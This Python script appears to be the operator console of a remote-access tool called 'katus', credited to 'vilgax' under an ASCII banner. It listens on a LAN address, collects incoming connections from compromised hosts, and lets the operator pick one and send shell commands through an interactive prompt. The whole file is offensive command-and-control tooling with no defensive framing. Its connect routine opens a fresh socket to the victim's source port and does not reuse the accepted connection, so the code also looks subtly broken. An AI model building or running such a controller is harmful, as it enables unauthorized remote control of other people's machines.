import socket
import os
import threading

os.system("cls")

connections = []

print("""


                                               
*@@@                  @@                       
  @@                  @@                       
  @@  m@@*  m@*@@m  @@@@@@ *@@@  *@@@   m@@*@@@
  @@ m@    @@   @@    @@     @@    @@   @@   **
  !@m@@     m@@@!@    @@     !@    @@   *@@@@@m
  !@ *@@m  @!   !@    @!     !@    @!        @@
  !!!!!     !!!!:!    !!     !@    !!   *!   @!
  :! *!!!  !!   :!    !!     !!    !!   !!   !!
: : :  : : :!: : !:   ::: :  :: !: :!:  : :!:    v1
                                               
                                               
coded by vilgax
""")

def list_connections():
    print("host are connected:")
    for i, conn in enumerate(connections):
        print(f"{i + 1}. {conn[1][0]}:{conn[1][1]}")

def close_all_connections():
    global connections
    for conn in connections:
        try:
            conn[0].close()
        except socket.error as e:
            print(f"[!] error occurred when disconnect {conn[1][0]}:{conn[1][1]}: {str(e)}")
    connections = []

def start_listener():
    server_ip = '192.168.1.11'
    server_port = 99
    listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener_socket.bind((server_ip, server_port))
    listener_socket.listen(99)  

    print(f"[*] listening on {server_ip}:{server_port}")

    def accept_connections():
        while True:
            try:
                conn, addr = listener_socket.accept()
                print(f"[+] connected {addr[0]}:{addr[1]}")
                connections.append((conn, addr))
            except socket.error as e:
                print(f"[!] error occurred when trying to connect: {str(e)}")

    accept_thread = threading.Thread(target=accept_connections)
    accept_thread.daemon = True
    accept_thread.start()

    while True:
        command = input("katus@shell>> ")
        if command.strip().lower() == 'exit':
            close_all_connections()
            listener_socket.close()
            break
        elif command.strip().lower() == 'list':
            list_connections()
        elif command.strip().lower().startswith('connect'):
            parts = command.split()
            if len(parts) == 2 and parts[1].isdigit():
                index = int(parts[1]) - 1
                if 0 <= index < len(connections):
                    selected_conn = connections[index]
                    katus_shell(selected_conn[1][0], selected_conn[1][1])
                else:
                    print("[!] wrong number to connect")
            else:
                print("[!] invalid command")
        else:
            print("[!] unknow command ")

    print("[*] disconnect.")

def katus_shell(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
    except socket.error as e:
        print(f"[!] unable to connect to {host}:{port}: {str(e)}")
        return

    print(f"[+] connected  {host}:{port}")

    def send_data():
        while True:
            command = input(f"katus@{host}:{port}=>> ")
            if command.strip().lower() == 'exit':
                client_socket.send(b'exit')
                break
            client_socket.send(command.encode())

    def receive_data():
        while True:
            response = client_socket.recv(1024).decode(errors='ignore')
            if not response:
                break
            print(response)

    send_thread = threading.Thread(target=send_data)
    receive_thread = threading.Thread(target=receive_data)

    send_thread.start()
    receive_thread.start()

    send_thread.join()
    receive_thread.join()

    print(f"[*] disconnect to {host}:{port}.")
    client_socket.close()

if __name__ == "__main__":
    start_listener()